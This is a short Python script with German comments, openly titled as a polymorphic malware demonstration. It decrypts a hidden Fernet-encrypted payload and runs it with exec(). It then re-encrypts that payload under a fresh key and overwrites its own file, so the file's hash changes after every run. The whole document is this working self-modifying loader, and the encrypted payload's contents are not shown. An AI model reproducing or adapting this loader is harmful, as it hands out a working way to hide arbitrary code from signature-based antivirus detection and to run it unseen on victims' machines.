# Polymorphe Malware - Demonstration
# Dieses Skript demonstriert polymorphe Code-Techniken:
# - Verschlüsselung des Payloads mit einem dynamischen Schlüssel
# - Selbstmodifikation nach jeder Ausführung
# - Bei jeder Ausführung wird ein neuer Verschlüsselungsschlüssel generiert
# - Der Datei-Hash ändert sich, aber die Code-Struktur bleibt gleich

import re
import os
from cryptography.fernet import Fernet

# Pfad zur eigenen Datei für Selbstmodifikation
pfad = os.path.abspath(__file__)

# Verschlüsselungsschlüssel (wird bei jeder Ausführung durch einen neuen ersetzt)
key = "l_yeL7fAkSsxXo7ZjC-Z49UNnaqN1HPjF-Dyjflp_kY="
# Verschlüsselter Payload (enthält den eigentlichen Code, der ausgeführt werden soll)
body = "gAAAAABpJcYdqVR1Ahi7wviI2dQWzHQ4V7oMuA8hOg_rPJejEtzhb3xkZ-02Vz_i40WNrEN47S0dIjBiBvEFrthAr5wCTVekEDyw5wWkaPtXMUHwcPcP_EHc18qqxXsRLFS4mt0TvSXKDwtEFwAEqy6gdK_ldWRHK8r16yvX-IGnWoQ7qcxWLWgiWRUBqHXEAFlRnDju6uts1umoo012jm_Z-8nip532LYoILOLwi4hVRcJk-2y-R7Q="

# Selbstmodifikation: Überschreibt die eigene Datei mit neuen Verschlüsselungsdaten
# Dies ist der Kern der polymorphen Technik - die Datei ändert sich nach jeder Ausführung
def updateFile(new_key, new_body):
    # Lese die aktuelle Datei ein
    with open(pfad, "r", encoding="utf-8") as f:
        text = f.read()

    # Ersetze den alten Schlüssel durch den neuen mittels Regex
    # Sucht nach der Zeile "key = "..."" und ersetzt nur den Wert
    text = re.sub(
        r'^(key\s*=\s*").*?(")',
        r'\g<1>' + new_key.decode() + r'\g<2>',
        text,
        flags=re.MULTILINE
    )

    # Ersetze den alten verschlüsselten Body durch den neuen
    # Sucht nach der Zeile "body = "..."" und ersetzt nur den Wert
    text = re.sub(
        r'^(body\s*=\s*").*?(")',
        r'\g<1>' + new_body.decode() + r'\g<2>',
        text,
        flags=re.MULTILINE
    )

    # Schreibe die modifizierte Datei zurück (überschreibt sich selbst)
    with open(pfad, "w", encoding="utf-8") as f:
        f.write(text)

# === HAUPTAUSFÜHRUNG ===

# 1. Erstelle ein Fernet-Cipher-Objekt mit dem aktuellen Schlüssel
cipher = Fernet(key.encode())

# 2. Entschlüssele den verschlüsselten Payload
#    - body.encode() wandelt den String in Bytes um
#    - cipher.decrypt() entschlüsselt die Bytes
#    - .decode() wandelt die Bytes zurück in einen String
decrypted = cipher.decrypt(body.encode()).decode("utf-8")

# 3. Führe den entschlüsselten Code aus
#    WARNUNG: exec() führt beliebigen Python-Code aus!
exec(decrypted)

# 4. Polymorphose: Bereite die nächste Generation vor
#    Generiere einen völlig neuen, zufälligen Verschlüsselungsschlüssel
new_key = Fernet.generate_key()

# 5. Erstelle ein neues Cipher-Objekt mit dem neuen Schlüssel
new_cipher = Fernet(new_key)

# 6. Verschlüssele den gleichen Payload mit dem neuen Schlüssel
#    Der Payload bleibt funktional identisch, aber die Verschlüsselung ist neu
new_body = new_cipher.encrypt(decrypted.encode("utf-8"))

# 7. Selbstmodifikation: Schreibe die Datei mit den neuen Daten um
#    Nach diesem Schritt ist die Datei verändert und hat einen neuen Hash
updateFile(new_key, new_body)
